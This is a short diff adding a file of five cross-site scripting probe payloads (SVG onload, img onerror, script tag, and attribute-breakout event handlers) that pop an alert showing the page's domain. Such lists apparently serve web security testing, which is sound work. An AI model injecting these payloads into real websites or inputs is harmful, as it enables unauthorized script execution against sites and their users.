@@ -1,0 +1,5 @@
+<svg/onload=prompt(document.domain)>
+"><img src=x onerror=alert(document.domain)>
+">">"><script>alert(document.domain)</script>
+" onload=confirm(document.domain)>
+" onmouseover=alert(document.domain)>
